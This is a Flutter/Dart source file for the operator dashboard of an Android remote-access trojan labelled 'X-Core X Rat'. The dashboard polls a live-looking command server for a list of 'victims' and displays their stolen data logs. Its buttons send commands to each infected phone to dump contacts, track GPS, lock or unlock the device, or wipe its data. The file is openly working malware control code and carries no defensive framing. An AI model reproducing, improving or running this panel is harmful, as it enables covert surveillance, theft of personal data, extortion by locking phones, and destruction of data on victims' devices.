import 'dart:async'; // PERBAIKAN: Wajib ada agar Timer.periodic jalan
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';

class ZDXDashboard extends StatefulWidget {
  const ZDXDashboard({super.key});

  @override
  _ZDXDashboardState createState() => _ZDXDashboardState();
}

class _ZDXDashboardState extends State<ZDXDashboard> {
  List victims = [];
  bool isLoading = false;
  final String serverUrl = "http://elainakurumiipanel.xtxintax.my.id:2012";

  Future<void> fetchVictims() async {
    if (!mounted) return;
    setState(() => isLoading = true);
    try {
      final res = await http.get(Uri.parse("$serverUrl/list")).timeout(const Duration(seconds: 10));
      if (res.statusCode == 200) {
        setState(() => victims = json.decode(res.body));
      }
    } catch (e) {
      debugPrint("Fetch Error: $e");
    } finally {
      if (mounted) setState(() => isLoading = false);
    }
  }

  Future<void> sendCommand(String victimId, String command) async {
    try {
      final res = await http.post(
        Uri.parse("$serverUrl/send_command"),
        body: jsonEncode({"id": victimId, "cmd": command}),
        headers: {"Content-Type": "application/json"},
      );
      
      if (res.statusCode == 200) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            backgroundColor: Colors.green[900],
            behavior: SnackBarBehavior.floating,
            content: Text("SENT: [$command] TO $victimId", 
              style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 12, color: Colors.greenAccent)),
          ),
        );
      }
    } catch (e) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text("Failed to connect to Command Server")),
      );
    }
  }

  @override
  void initState() {
    super.initState();
    fetchVictims();
    // PERBAIKAN: Timer sekarang terbaca karena import dart:async sudah ditambahkan
    Timer.periodic(const Duration(seconds: 5), (t) => fetchVictims());
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        title: const Text("X-Core X Rat", 
          style: TextStyle(color: Colors.red, fontWeight: FontWeight.bold, letterSpacing: 2, fontSize: 14)),
        backgroundColor: Colors.black,
        centerTitle: true,
        elevation: 0,
        bottom: PreferredSize(
          preferredSize: const Size.fromHeight(1),
          child: Container(color: Colors.red.withOpacity(0.5), height: 0.5),
        ),
        leading: IconButton(
          icon: const Icon(Icons.security, color: Colors.red),
          onPressed: () => Navigator.pop(context),
        ),
        actions: [
          IconButton(
            icon: const Icon(Icons.sync, color: Colors.red), 
            onPressed: fetchVictims
          )
        ],
      ),
      body: isLoading 
        ? const Center(child: CircularProgressIndicator(color: Colors.red, strokeWidth: 2))
        : victims.isEmpty 
          ? _buildEmptyState()
          : ListView.builder(
              physics: const BouncingScrollPhysics(),
              itemCount: victims.length,
              itemBuilder: (context, i) => _buildVictimCard(i),
            ),
    );
  }

  Widget _buildEmptyState() {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(Icons.sensors_off, size: 50, color: Colors.grey[800]),
          const SizedBox(height: 10),
          const Text("NO ACTIVE TARGETS FOUND", style: TextStyle(color: Colors.grey, fontSize: 12)),
        ],
      ),
    );
  }

  Widget _buildVictimCard(int i) {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
      decoration: BoxDecoration(
        color: Colors.grey[900]?.withOpacity(0.3),
        border: Border.all(color: Colors.red.withOpacity(0.2)),
        borderRadius: BorderRadius.circular(4)
      ),
      child: ExpansionTile(
        iconColor: Colors.red,
        collapsedIconColor: Colors.grey,
        leading: const Icon(Icons.android, color: Colors.greenAccent, size: 20),
        title: Text(victims[i]['model'] ?? 'Unknown Device', 
          style: const TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.w600)),
        subtitle: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text("ID: ${victims[i]['id']}", 
              style: const TextStyle(color: Colors.redAccent, fontSize: 10, fontFamily: 'ShareTechMono')),
            Text("Seen: ${victims[i]['seen'] ?? 'N/A'}", 
              style: const TextStyle(color: Colors.white38, fontSize: 10)),
          ],
        ),
        children: [
          Padding(
            padding: const EdgeInsets.all(12),
            child: Column(
              children: [
                const Text("--- REMOTE EXECUTOR ---", 
                  style: TextStyle(color: Colors.red, fontSize: 10, fontWeight: FontWeight.bold)),
                const SizedBox(height: 12),
                Wrap(
                  spacing: 6,
                  runSpacing: 6,
                  alignment: WrapAlignment.center,
                  children: [
                    _actionButton("CONTACTS", Colors.blue, () => sendCommand(victims[i]['id'], "dump_contacts")),
                    _actionButton("GPS", Colors.green, () => sendCommand(victims[i]['id'], "track_gps")),
                    _actionButton("LOCK", Colors.redAccent, () => sendCommand(victims[i]['id'], "lock_device")),
                    _actionButton("UNLOCK", Colors.greenAccent, () => sendCommand(victims[i]['id'], "unlock_device")),
                    _actionButton("WIPE", Colors.red, () => sendCommand(victims[i]['id'], "wipe_data")),
                  ],
                ),
                const SizedBox(height: 20),
                _buildDataLog(victims[i]['stolen_info'] ?? 'No logs available.'),
              ],
            ),
          )
        ],
      ),
    );
  }

  Widget _buildDataLog(String log) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        const Text("DATA LOG OUTPUT:", style: TextStyle(color: Colors.grey, fontSize: 9, fontWeight: FontWeight.bold)),
        const SizedBox(height: 6),
        Container(
          height: 150,
          width: double.infinity,
          padding: const EdgeInsets.all(8),
          decoration: BoxDecoration(
            color: Colors.black,
            border: Border.all(color: Colors.white12),
            borderRadius: BorderRadius.circular(4)
          ),
          child: SingleChildScrollView(
            child: Text(log, style: const TextStyle(color: Colors.greenAccent, fontSize: 10, fontFamily: 'ShareTechMono')),
          ),
        )
      ],
    );
  }

  Widget _actionButton(String title, Color color, VoidCallback onPress) {
    return SizedBox(
      height: 30,
      child: OutlinedButton(
        style: OutlinedButton.styleFrom(
          side: BorderSide(color: color.withOpacity(0.5)),
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(2))
        ),
        onPressed: onPress,
        child: Text(title, style: TextStyle(fontSize: 9, color: color, fontWeight: FontWeight.bold)),
      ),
    );
  }
}